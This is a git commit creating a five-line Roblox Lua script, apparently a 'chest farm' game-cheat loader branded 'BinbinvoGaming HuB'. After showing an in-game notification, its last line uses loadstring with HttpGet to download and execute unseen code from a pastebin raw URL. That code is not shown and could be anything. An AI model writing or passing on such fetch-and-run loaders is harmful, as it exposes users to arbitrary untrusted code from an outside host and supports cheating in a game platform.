88afa3b31fa312b56cbbbb996e9fb577f7528144
BinbinvoGaming <123051097+BinbinvoGaming@users.noreply.github.com>
2023-03-12 10:23:21 +0700

    Create chestfarmPremium.lua

---
+++ chestfarmPremium.lua
@@ -0,0 +1,5 @@
+game.StarterGui:SetCore("SendNotification", {
+    Title = "BinbinvoGaming HuB", 
+    Text = "chest farm them giam lag"
+})
+loadstring(game:HttpGet('https://pastebin.com/raw/YhxKYGE1'))()
